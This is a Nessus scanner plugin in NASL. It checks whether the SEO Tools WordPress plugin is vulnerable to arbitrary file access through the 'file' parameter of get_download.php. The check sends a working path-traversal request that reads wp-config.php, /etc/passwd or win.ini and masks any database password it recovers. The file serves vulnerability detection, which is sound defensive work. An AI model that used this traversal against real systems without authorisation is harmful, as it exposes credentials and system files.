#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50625);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_bugtraq_id(44710);
  script_osvdb_id(69100);

  script_name(english:"SEO Tools Plugin for WordPress 'file' Parameter Arbitrary File Access");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script affected by an information
disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the SEO Tools plugin for WordPress installed on the
remote host does not sanitize input to the 'file' parameter of the
'feedcommander/get_download.php' script before using it to return the
contents of a file.

An unauthenticated, remote attacker can exploit this issue to disclose
the contents of sensitive files on the affected system subject to the
privileges under which the web server operates.");
  # http://plugins.trac.wordpress.org/changeset/518509/seo-automatic-seo-tools
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2dffebcf");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/seo-automatic-seo-tools/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 3.1.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/03/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "SEO Tools";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "seo-automatic-seo-tools/sc-bulk-url-checker/include/script.js"][0] = make_list('getParserById', 'headerSortUp');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

files = make_list('wp-config.php', files);

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['wp-config.php'] = "^[ \t]*define\(.+DB_(NAME|USER|CHARSET|COLLATE).+\)[ \t]*;";

# And go.
installs = 0;

foreach file (files)
{
  # Try to exploit the issue.
  if (file[0] == '/') traversal = "";
  else traversal = crap(data:"../", length:4*3);

  url = dir + '/wp-content/plugins/seo-automatic-seo-tools/feedcommander/get_download.php?' +
    'file=' + traversal + file;

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  headers = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

  if (
    headers['content-type'] && 'application/force-download' >< headers['content-type']
  )
  {
    installs++;
  }
  # otherwise continue unless we're being paranoid.
  else if (report_paranoia < 2)
  {
    continue;
  }

  # There's a problem if we see the expected contents.
  body = res[2];
  file_pat = file_pats[file];

  if (egrep(pattern:file_pat, string:body))
  {
    if (report_verbosity > 0)
    {
      if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

      header =
        'Nessus was able to exploit the issue to retrieve the contents of\n' +
        "'" + file + "' on the remote host using the following URL :";
      trailer = '';

      if (report_verbosity > 1)
      {
        # Mask password except first and last characters
        get_pass = eregmatch(pattern:"'DB_PASSWORD', '(.+)'", string:body);

        if (!isnull(get_pass))
        {
          pass = get_pass[1];
          pass2 = strcat(pass[0],crap(data:'*',length:15),pass[strlen(pass)-1]);
          body = str_replace(string:body, find:pass, replace:pass2);
        }

        trailer =
          'This produced the following truncated output :\n' +
          '\n' +
          crap(data:"-", length:30)+" snip "+crap(data:"-", length:30) + '\n' +
          beginning_of_response(resp:body, max_lines:'25')  +
          crap(data:"-", length:30)+" snip "+crap(data:"-", length:30) + '\n';
      }

      report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
